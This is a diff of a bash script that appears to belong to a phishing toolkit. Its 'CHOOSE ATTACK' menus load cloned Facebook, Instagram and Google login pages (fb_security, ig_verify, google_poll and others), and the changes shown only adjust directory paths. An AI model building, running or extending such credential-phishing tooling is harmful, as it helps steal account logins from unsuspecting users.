@@ -139,10 +139,10 @@ echo -e "\n"
 read -p "CHOOSE ATTACK : " FB
 case $OP in
 1)
-cd .sites/facebook
+cd .sites/
 local
 
-cd joker/.sites/facebook
+cd facebook
  
 while true;
 
@@ -166,9 +166,9 @@ fi
 done
 ;;
 2)
-cd .sites/fb_advanced
+cd .sites/
 local
-cd joker/.sites/fb_advanced
+cd fb_advanced
 while true;
 
 do
@@ -191,10 +191,10 @@ fi
 done
 ;;
 3)
-cd .sites/fb_security
+cd .sites/
 local
 
-cd joker/.sites/fb_security
+cd fb_security
 while true;
 
 do
@@ -217,10 +217,10 @@ fi
 done
 ;;
 4)
-cd .sites/fb_messenger
-local
+cd .sites
+local 
 
-cd joker/.sites/fb_messenger
+cd fb_messenger
 
 while true;
 
@@ -271,10 +271,10 @@ read -p "CHOOSE ATTACK : " IG
 case $IG in 
 1)
 
-cd .sites/instagram
+cd .sites/
 local
 
-cd joker/.sites/instagram
+cd instagram
 
 while true;
 
@@ -298,10 +298,10 @@ fi
 done
 ;;
 2)
-cd .sites/ig_followers
+cd .sites/
 local
 
-cd joker/.sites/ig_followers
+cd ig_followers
 
 while true;
 
@@ -325,10 +325,10 @@ fi
 done
 ;;
 3)
-cd .sites/insta_followers
+cd .sites
 local
 
-cd joker/.sites/insta_followers
+cd insta_followers
 
 while true;
 
@@ -352,10 +352,10 @@ fi
 done
 ;;
 4)
-cd .sites/ig_verify
+cd .sites/
 local
 
-cd joker/.sites/ig_verify
+cd ig_verify
 
 while true;
 
@@ -406,10 +406,10 @@ read -p "CHOOSE ATTACK : " GG
 case $GG in
 1)
 
-cd .sites/google
+cd .sites/
 local
 
-cd joker/.sites/google
+cd google
 ip
 while true;
 
@@ -432,10 +432,10 @@ fi
 done
 ;;
 2)
-cd .sites/google_poll
+cd .sites/
 local
 
-cd joker/.sites/google_poll
+cd google_poll
 
 while true;
 
@@ -459,10 +459,10 @@ fi
 done
 ;;
 3)
-cd .sites/google_new
+cd .sites
 local
 
-cd joker/.sites/google_new
+cd google_new
 
 while true;
 
